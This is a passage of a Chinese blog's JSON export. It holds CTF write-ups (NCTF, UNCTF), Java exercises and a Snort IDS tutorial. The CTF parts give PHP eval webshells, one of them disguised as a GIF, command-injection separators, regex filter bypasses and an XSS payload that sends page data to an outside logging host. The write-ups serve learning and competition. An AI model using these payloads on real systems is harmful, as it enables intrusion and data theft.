$a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>令执行利用及绕过姿势　　</p>\n<p>写入webshell:</p>\n<p>利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义，假设需要写入<?php eval($_POST[kang]); ?>，方法如下：<br>WINDOWS：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web可写目录加文件完整名字</p>\n<p>linux下需要用\\来转义&lt;，不过很多php都默认开启gpc（魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web可写目录加文件完整名字</p>\n<p>| 命令管道符</p>\n<p>&lt;&gt;&gt;&gt; 文件重定向符</p>\n<p>测试： 0 | dir c:</p>\n<p>　　代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</p>\n<p>windows支持：</p>\n<p>|     直接执行后面的语句      ping 127.0.0.1|whoami          </p>\n<p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p>\n<p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linux支持(比上面多一个):</p>\n<p>;     前面的执行完执行后面的      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>打开题目在头像那里得 image 找到上传点，先上传</p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>提示 <code>&lt;?</code> ，然后直接拿上次 SUCTF 用剩下得马</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>然后再修改 content-type ，传完得到图片路径，但是不能直接访问，观察到链接为 </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>于是访问</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>即可</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>文字替换工具，hint：<code>使用php5.6+bootstrap进行开发</code> ，猜测 <code>preg_replace</code> 的 <code>/e</code> 代码执行。</p>\n<p>第三个框内的内容应该就是 /e的部分，我们输入 <code>var_dump(111)</code> ，成功打印 <code>int(111)</code> ，输入单引号双引号都会被过滤，可以利用 chr() 来绕过。</p>\n<p>我们输入scandir(chr(47)) 发现列不了目录。直接读文件 </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","text":"NCTF11/26/2019 8:45:31 PM WEBFake XML cookbook简单的xxe&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"java","slug":"java-tests","date":"2019-11-26T01:26:49.000Z","updated":"2019-12-01T12:59:07.431Z","comments":true,"path":"api/articles/java-tests.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"java-tests\"><a href=\"#java-tests\" class=\"headerlink\" title=\"java-tests\"></a>java-tests</h1><p>11/26/2019 9:26:49 AM </p>\n<h2 id=\"charper-two\"><a href=\"#charper-two\" class=\"headerlink\" title=\"charper two\"></a>charper two</h2><ul>\n<li>输入一个整数，输出阶乘最右边的非0数字</li>\n</ul>\n<pre><code>package the_second_chapter;\n\nimport java.math.BigInteger;\nimport java.util.Scanner;\n\npublic class first_one {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    //int sum = 0,temp = 1;\n    BigInteger num = new BigInteger(&quot;1&quot;);\n    System.out.println(&quot;你想算多少的阶乘?&quot;);\n    Scanner scn = null;//防止 Scanner is never closed 的错误\n    try {\n        scn = new Scanner(System.in);\n        int num1 = scn.nextInt();\n        for(int number=1;number&lt;=num1;number++)\n        {\n            num = num.multiply(new BigInteger(number + &quot;&quot;));\n        }\n        System.out.println(num);\n    }\n    finally {\n        if(scn!=null)\n            scn.close();\n    }\n    char[] c = num.toString().toCharArray();              \n    System.out.println(num.toString().length());        //输出长度\n    for(int b=num.toString().length()-1;b&gt;=0;b--) {        //判断非0\n        if(c[b]!=&apos;0&apos;) {\n            System.out.println(c[b]);\n            return;\n        }\n    }\n}\n\n}</code></pre><blockquote>\n<p>String.ToCharArray Method</p>\n<p>Definition</p>\n<p>Namespace: System</p>\n<p>Assemblies: System.Runtime.dll, mscorlib.dll, netstandard.dll</p>\n<p>Copies the characters in this instance(实例) to a Unicode character array.</p>\n<p><a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8</a></p>\n</blockquote>\n<ul>\n<li>输入一组数字保存在数组中，遇到0表示输入结束，将输入的数组逆序输出</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\n\npublic class test_9 {\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner input=new Scanner(System.in);\n    int[] num=new int[20];\n    int i;\n    for(i=0;;i++)\n    {\n        int a=input.nextInt();\n        if(a==0)\n            break;\n        num[i]=a;\n    }\n    for(i=i-1;i&gt;=0;i--)\n    {\n        System.out.print(num[i]);\n        if(i!=0)\n            System.out.print(&quot; &quot;);\n    }\n    System.out.println();\n}\n}</code></pre><ul>\n<li>超级递增序列</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\n\npublic class test_10 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scn = new Scanner(System.in);\n    int[] num = new int[20];\n    int i,flag=0;\n    int sum=0;\n    for(i=0;;i++) {\n        int a = scn.nextInt();\n        if(a==-999)\n            break;\n        num[i] = a;\n    }\n    for(int j=0;j&lt;num.length;j++) {\n        sum += num[j];\n        if(sum&lt;num[j+1])\n            flag=1;\n        else {\n            flag=2;\n            break;\n        }\n    if(flag==1) {\n        System.out.print(&quot;超级递增！&quot;);\n\n    }\n    else {\n        System.out.print(&quot;不是超级递增&quot;);\n    }\n    }\n}\n\n}</code></pre><ul>\n<li>统计字符串中单词个数</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\npublic class test_11 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scanner = new Scanner(System.in);\n    String s = scanner.nextLine();\n    String []arr = s.split(&quot; &quot;);\n    int count = 0;\n    for (int i = 0;i&lt;arr.length;i++){\n        for (int j = i+1;j&lt;arr.length;j++){\n            if (arr[i].equals( arr[j])){\n                arr[j] = &quot; &quot;;\n            }\n        }\n    }\n    for (int i = 0;i&lt;arr.length;i++){\n        System.out.println(arr[i]);\n    }\n    for (int i = 0;i&lt;arr.length;i++){\n        if (arr[i] != &quot; &quot;){\n            count++;\n        }\n    }\n    System.out.println(count);\n}\n\n}</code></pre><h2 id=\"third-chapter\"><a href=\"#third-chapter\" class=\"headerlink\" title=\"third_chapter\"></a>third_chapter</h2><ul>\n<li>修改文件名称</li>\n</ul>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\npublic class test_4 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scn = new Scanner(System.in);\n    System.out.print(&quot;请输入旧文件路径及名称(D:\\\\test.txt)：&quot;);\n    String old_path = scn.next();\n    File old_file = new File(old_path);\n    System.out.print(&quot;请输入新文件名称(D:\\\\test1.txt)：&quot;);\n    String new_path = scn.next();\n    File new_file = new File(new_path);\n    if(old_file.exists() &amp;&amp; !new_file.exists()) {\n        old_file.renameTo(new_file);\n        System.out.print(&quot;reanme successful!&quot;);\n    }\n    else {\n        System.out.print(&quot;rename failue!&quot;);\n    }\n}\n\n}</code></pre><ul>\n<li><p>实现copy命令</p>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\npublic class test_6 {\n\npublic static void main(String[] args) throws FileNotFoundException {\n    // TODO Auto-generated method stub\n    try {\n    Scanner scn = new Scanner(System.in);\n    //输入文件名\n    System.out.print(&quot;请输入要复制的文件路径及名称：&quot;);\n    String old_file = scn.next();\n    FileReader old_one = new FileReader(old_file);   //创建文件对象\n    BufferedReader old_one_cont = new BufferedReader(old_one);//读文件\n    System.out.print(&quot;请输入要复制到的文件路径及名称：&quot;);\n    String new_file = scn.next();\n    FileWriter new_one = new FileWriter(new_file);   //创建文件对象\n    BufferedWriter new_one_cont = new BufferedWriter(new_one);//读文件\n    String content = null;\n    while((content = old_one_cont.readLine())!=null) {\n        new_one_cont.write(content);\n        new_one_cont.newLine();\n    }\n    //关闭文件\n    new_one_cont.flush();\n    new_one_cont.close();\n    new_one.close();\n\n    }\n    catch(IOException e) {\n        System.out.print(e.toString());\n    }\n}\n\n}</code></pre></li>\n</ul>\n<ul>\n<li><p>实现删除注释功能</p>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\n/**\n * @author brian\n *\n * @date: 2019年12月1日 上午10:57:42\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\npublic class test_8 {\n\n    /**\n     * @param args\n     * @throws FileNotFoundException \n     */\n    public static void main(String[] args) throws FileNotFoundException {\n        // TODO Auto-generated method stub\n        try {\n        Scanner scn = new Scanner(System.in);\n        System.out.println(&quot;请输入要删除注释的文件路径及文件名：&quot;);\n        String old_file = scn.next();\n        FileReader old_one = new FileReader(old_file);\n        BufferedReader old_cont = new BufferedReader(old_one);\n        System.out.print(&quot;请输入要复制到的文件路径及名称：&quot;);\n        String new_file = scn.next();\n        FileWriter new_one = new FileWriter(new_file);   //创建文件对象\n        BufferedWriter new_one_cont = new BufferedWriter(new_one);//读文件\n        String content = null;\n        while((content = old_cont.readLine())!=null) {\n            /**判断是否存在注释\n             * trim(): 将调用该方法的String的前后空格删除，返回新字符串\n             * indexOf(): 查找参数字符串在调用改方法的String中首次出现的位置，参数字符串不存在返回-1\n             * &amp; ：与运算，两边都是true时结果为true\n             * | ：或运算，两边任意一个为true，结果为true，都不是true，结果为false\n             */\n            if((content.trim().indexOf(&quot;//&quot;)==-1)&amp;(content.trim().indexOf(&quot;/*&quot;)==-1)&amp;(content.trim().indexOf(&quot;*/&quot;)==-1)) {\n                System.out.println(content);\n                new_one_cont.write(content);\n                new_one_cont.newLine();\n            }\n                //System.out.print(content+&quot;\\n&quot;);\n        }\n        //关闭文件\n        new_one_cont.flush();\n        new_one_cont.close();\n        new_one.close();\n    } catch (IOException e) {\n            // TODO Auto-generated catch block\n        e.printStackTrace();\n    }\n}\n\n}</code></pre></li>\n</ul>\n<h2 id=\"six-chapter\"><a href=\"#six-chapter\" class=\"headerlink\" title=\"six_chapter\"></a>six_chapter</h2><ul>\n<li><p>多线程打印线程号</p>\n<pre><code>package sixth_chapter;\n\n/**\n * @author brian\n *\n * @date: 2019年12月1日 下午7:50:35\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\npublic class SecondThread implements Runnable{\n\n    /**\n     * @param args\n     */\n    public void run() {\n        for(int i=0;i&lt;5;i++) {\n\n            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+(char)(i+&apos;A&apos;));\n            try {\n                Thread.sleep(700);\n            }\n            catch(InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    public static void main(String[] args) {\n        // TODO Auto-generated method stub\n\n    }\n\n}</code></pre></li>\n</ul>\n<pre><code>package sixth_chapter;\n//import FitstThread;\n//import SecondThread;\n\n/**\n * @author brian\n *\n * @date: 2019年12月1日 下午7:19:12\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\n\n\npublic class test_4 {\n\n    /**\n     * @param args\n     */\n    public static void main(String[] args) {\n        // TODO Auto-generated method stub\n        Runnable target = new SecondThread();\n        Thread t1 = new Thread(target);\n        Thread t2 = new Thread(target);\n        for(int i=0;i&lt;10;i++) {\n            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+i);\n            try {\n                Thread.sleep(700);\n            }\n            catch(InterruptedException e) {\n                e.printStackTrace();\n            }\n            if(i==1) t1.start();\n            if(i==2) t2.start();\n        }\n    }\n\n}</code></pre><ul>\n<li>线程互斥</li>\n</ul>\n","text":"java-tests11/26/2019 9:26:49 AM charper two输入一个整数，输出阶乘最右边的非0数字package the_second_chapter;import java.math.BigInteger;import java.util.Scanne","link":"","raw":null,"photos":[],"categories":[{"name":"java","slug":"java","count":1,"path":"api/categories/java.json"}],"tags":[{"name":"java's things","slug":"java-s-things","count":1,"path":"api/tags/java-s-things.json"}]},{"title":"snort 安全防御","slug":"snort-安全防御","date":"2019-11-24T14:57:59.000Z","updated":"2019-12-01T12:57:42.268Z","comments":true,"path":"api/articles/snort-安全防御.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"安全防御-snort\"><a href=\"#安全防御-snort\" class=\"headerlink\" title=\"安全防御-snort\"></a>安全防御-snort</h1><p>Snort IDS（入侵检测系统）是一个强大的网络入侵检测系统。它具有实时数据流量分析和记录IP网络数据包的能力，能够进行协议分析，对网络数据包内容进行搜索/匹配。它能够检测各种不同的攻击方式，对攻击进行实时报警。此外，Snort是开源的入侵检测系统，并具有很好的扩展性和可移植性。</p>\n<h2 id=\"Snort-简介\"><a href=\"#Snort-简介\" class=\"headerlink\" title=\"Snort 简介\"></a>Snort 简介</h2><h3 id=\"snort体系结构\"><a href=\"#snort体系结构\" class=\"headerlink\" title=\"snort体系结构\"></a>snort体系结构</h3><p>Snort的结构由4大软件模块组成，它们分别是：</p>\n<ol>\n<li>数据包嗅探模块——负责监听网络数据包，对网络进行分；</li>\n<li>预处理模块——该模块用相应的插件来检查原始数据包，从中发现原始数据的“行为”，如端口扫描，IP碎片等，数据包经过预处理后才传到检测引擎；</li>\n<li>检测模块——该模块是Snort的核心模块。当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块；</li>\n<li>报警/日志模块——经检测引擎检查后的Snort数据需要以某种方式输出。如果检测引擎中的某条规则被匹配，则会触发一条报警，这条报警信息会通过网络、UNIXsocket、WindowsPopu(SMB)、SNMP协议的trap命令传送给日志文件，甚至可以将报警传送给第三方插件（如SnortSam），另外报警信息也可以记入SQL数据库。</li>\n</ol>\n<h3 id=\"snort三种工作方式\"><a href=\"#snort三种工作方式\" class=\"headerlink\" title=\"snort三种工作方式\"></a>snort三种工作方式</h3><p>Snort拥有三大基本功能：嗅探器、数据包记录器和入侵检测。</p>\n<ol>\n<li>嗅探器模式仅从网络上读取数据包并作为连续不断的流显示在终端上，常用命令snort -v。使用这个命令将使snort只输出IP/TCP/UDP/ICMP的包头信息</li>\n<li>数据包记录器模式是把数据包记录到硬盘上，常用命令snort –l 指定一个目录。这会将所有的包记录到硬盘上。</li>\n<li>网络入侵检测模式是最复杂的，而且是可配置的。我们可以让Snort分析网络数据流以匹配用户定义的一些规则，并根据检测结果采取一定的动作。</li>\n</ol>\n<h2 id=\"如何使用0x01\"><a href=\"#如何使用0x01\" class=\"headerlink\" title=\"如何使用0x01\"></a>如何使用0x01</h2><h3 id=\"snort-规则定义\"><a href=\"#snort-规则定义\" class=\"headerlink\" title=\"snort 规则定义\"></a>snort 规则定义</h3><p>Snort使用一种简单的规则描述语言，这种描述语言易于扩展，功能也比较强大。<br>Snort规则是基于文本的，规则文件按照不同的组进行分类，比如，文件<code>ftp.rules</code>包含了FTP攻击内容。<br>「注」Snort的每条规则必须在一行中，它的规则解释器无法对跨行的规则进行解析。Snort的每条规则都可以分成逻辑上的两个部分：<strong>规则头和规则体</strong>。</p>\n<p>规则头包括4个部分：<strong>规则行为；协议；源信息；目的信息</strong>。</p>\n<p>snort规则头Snort预置的规则动作有5种：</p>\n<ol>\n<li>pass—动作选项pass将忽略当前的包，后继捕获的包将被继续分析。</li>\n<li>log—动作选项log将按照自己配置的格式记录包。</li>\n<li>alert—动作选项alert将按照自己配置的格式记录包，然后进行报警。它的功能强大，但是必须恰当的用，因为如果报警记录过多，从中攫取有效信息的工作量增大，反而会使安全防护工作变得低效。</li>\n<li>dynamic—动作选项dynamic是比较独特的一种，它保持在一种潜伏状态，直到activate类型的规则将其触发，之后它将像log动作一样记录数据包。</li>\n<li>activate—动作选项activate功能强大，当被规则触发时生成报警，并启动相关的dynamic类型规则。在检测复杂的攻击，或对数据进行归类时，该动作选项相当有用。除了以上5种预置的规则动作类型，用户还可以定制自己的类型。</li>\n</ol>\n<p>规则体的作用是在规则头信息的基础上进一步分析，有了它才能确认复杂的攻击(Snort的规则定义中可以没有规则体)。规则体由若干个被分别隔开的片断组成，每个片断定义了一个选项和相应的选项值。一部分选项是对各种协议的详细说明，包括IP、ICMP和TCP协议，其余的选项是：规则触发时提供给管理员的参考信息，被搜索的关键字，Snort规则的标识和大小写不敏感选项。下面是一个规则实例。</p>\n<pre><code>alert tcp !192.168.43.0/24 any -&gt;any 21 (content:&quot;USER&quot;;msg: &quot;FTP Login&quot;;)</code></pre><ol>\n<li><code>alert</code>表示规则动作为报警。                                         </li>\n<li><code>tcp</code>表示协议类型为TCP协议。 </li>\n<li><code>!192.168.0.1/24</code>表示源IP地址不是192.168.0.1/24。 </li>\n<li>第一个<code>any</code>表示源端口为任意端口。                            </li>\n<li><code>-&gt;</code>表示发送方向操作符，方向操作符左边的ip地址和端口号被认为是流来自的源主机</li>\n<li>第二个any表示目的IP地址为任意IP地址。</li>\n<li>21表示目的端口为21。 </li>\n<li><code>content:&quot;USER&quot;</code>表示匹配的字符串为“USER”。      </li>\n<li><code>msg:&quot;FTPLogin&quot;</code>表示报警信息为“FTPLogin”</li>\n</ol>\n<p>预处理器在调用检测引擎之前，在数据包被解码之后运行。通过这种机制，Snort可以以一种<code>out of band</code>的方式对数据包进行修改或者分析。<br>预处理器可以使用<code>preprocessor</code>关键词来加载和配置，常用到的预处理器如下:</p>\n<ol>\n<li><code>HTTPdecode</code>预处器HTTP解码预处理模块用来处理HTTPURL字符串，把它们转换为清晰的ASCII字符串。</li>\n<li>端口扫描器<code>portscan</code>端口扫描器会把由单个源IP地址发起的端口扫描从开始到结束的全过程记录到标准日志。</li>\n<li><code>stream</code>处理器stream处理器为snort提供了TCP数据包重组的功能。在配置的端口上，stream处理器能够对TCP数据包的细小片段进行重组，使之成为完整的TCP数据包，然后snort可以对其可疑行为进行检查。</li>\n<li><code>frag2</code>处理器frag2预处理器为snort提供了IP分片重组的功能。frag2预处理器能够对分片包进行重组来定位分片攻击，它的工作原理是将所有的分片重组构造成一个包含完整信息的数据包，再将这个包传给检测引擎。</li>\n</ol>\n<h3 id=\"编写规则\"><a href=\"#编写规则\" class=\"headerlink\" title=\"编写规则\"></a>编写规则</h3><p>我们在使用开始前一定要注意选择好网卡，在snort.exe文件所在目录用<code>snort -W</code>查看系统可用网络接口。记住需要监视的网卡的编号，比如为2，那么在以后的使用中，用<code>-i 2</code>就可以选择对应的网卡。</p>\n<p>我们先新建规则</p>\n<pre><code>alert icmp any any -&gt; 192.168.43.137 any (msg:＂ICMP PING＂;sid:10000)</code></pre><p>ip地址是我的主机ip。这条规则的意思就是 对来自任何地址的<code>icmp</code>数据包发出警告信息.</p>\n<p>执行命令：</p>\n<pre><code>snort -i 2 -c ../etc/snort.conf -l ./log</code></pre><p>我们将编写的规则写入<code>snort.conf</code>中，在这里我们需要 <code>-c</code> 来指定我们用的规则，并将日志记录到 log 文件加中。</p>\n<p>日志是二进制保存的，对于查看日志文件我们需要执行</p>\n<pre><code>snort -dvr snort.log.xxxx</code></pre><h2 id=\"如何使用0x02\"><a href=\"#如何使用0x02\" class=\"headerlink\" title=\"如何使用0x02\"></a>如何使用0x02</h2><h3 id=\"使用-snort-检测局域网内-sqlmap-行为\"><a href=\"#使用-snort-检测局域网内-sqlmap-行为\" class=\"headerlink\" title=\"使用 snort 检测局域网内 sqlmap 行为\"></a>使用 snort 检测局域网内 sqlmap 行为</h3><p>先编写规则</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;sqlmap&quot;;sid=10000;classtype:webscan;rev=1)</code></pre><p>在 <code>classification.conf</code> 中添加 webscan 类型的规则</p>\n<pre><code>config classfiction 描述，描述，危险等级\nconfig classification:shortname,short description,priority\nconfig classification: webscan,webscan sqlmap,1</code></pre><p>在 <code>sid-msg.map</code> 中添加预定义描述</p>\n<pre><code>10000 || webscan sqlmap detected || mcafee,98775</code></pre><p>本地起 dvwa 之后使用 low 级别的 sql注入 ，将payload放入sqlmap，随后打开snort进行监听发现了sqlmap行为。</p>\n<p>但是这里存在问题，snort 在UA头里检测到了 sqlmap 字符串，然后打印了警告信息，这样的检测不够严谨，因为我们如果在 sql 注入的地方填入sqlmap它同样会触发 snort 警告。</p>\n<p>我们修改原来的规则为</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;User-Agent: sqlmap/&quot;;sid=10000;classtype:webscan;rev=2)</code></pre><p>此时我们就能针对 UA 头进行监测(rev也加一，跟之前的记录进行区分)。</p>\n<p>但是 sqlmap 其实可以绕过 UA 头的检测，我们在 sqlmap 中添加 <code>random-agent</code> 参数，就可以使用不同的 UA 。</p>\n<p>另外，在使用规则时我们也可以通过添加多个 content 来进行检测：</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;and&quot;;content:&quot;=&quot;;sid=10001;classtype:webscan;rev=2)</code></pre><p>这样在匹配到两个关键词时就会触发警告。</p>\n<p>对于其他的攻击，我们可以通过访问日志来抓取不同的请求，然后添加到对应的规则里。</p>\n<p>除此之外，我们还可以制定一个依据访问频率的规则：</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;too many access&quot;;content:&quot;192.168.10.132/login.php&quot;;detection_filter:count 3, second 300,track by_src;sid=10002;classtype:webscan;rev=1)</code></pre><p>这样5分钟内发出三次请求就会被检测到。</p>\n","text":"安全防御-snortSnort IDS（入侵检测系统）是一个强大的网络入侵检测系统。它具有实时数据流量分析和记录IP网络数据包的能力，能够进行协议分析，对网络数据包内容进行搜索/匹配。它能够检测各种不同的攻击方式，对攻击进行实时报警。此外，Snort是开源的入侵检测系统，并具有很","link":"","raw":null,"photos":[],"categories":[{"name":"渗透测试","slug":"渗透测试","count":5,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}]},{"title":"UNctf 赛后回顾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-赛后回顾\"><a href=\"#UNctf-赛后回顾\" class=\"headerlink\" title=\"UNctf 赛后回顾\"></a>UNctf 赛后回顾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>题目源码：</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>正则黑名单匹配，对输入的参数强制加上双引号，即使我们绕过检测也会被加上双引号无法执行命令。这里用到了反引号 ```</p>\n<p>观察第一个正则 `\\|`` 三个反斜杠才能转义反斜杠，这里对 | 进行了转义从而造成反引号逃逸。</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>可以看到反引号成功逃逸。</p>\n<p>我们到题目中尝试列目录，没有 <code>ls</code> 可以用 <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\n响应：\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>查找flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\n响应：\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>第二个正则 <code>\\\\|\\n</code> 会解释为竖线和换行，所以利用 <code>%0a</code> 进行换行绕过，同时末尾使用 <code>%20#</code> 来终止命令处理双引号</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\n效果是\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>在留言板处提交 xss 发现能够触发，访问储存的路径发现一个接口</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>此时的请求头里带上了 <code>XMLHttpRequest</code> ，同时不带参数访问时得到 debug 页面，可以看到 XHR请求带上了 cookie ，于是我们构造 XHR 请求</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>查看源码发现各个接口</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`🙁${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>修改完名字后测试 <code>/calc 1+1</code> 发现成功执行，存在代码注入参考<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>尝试 <code>/calc 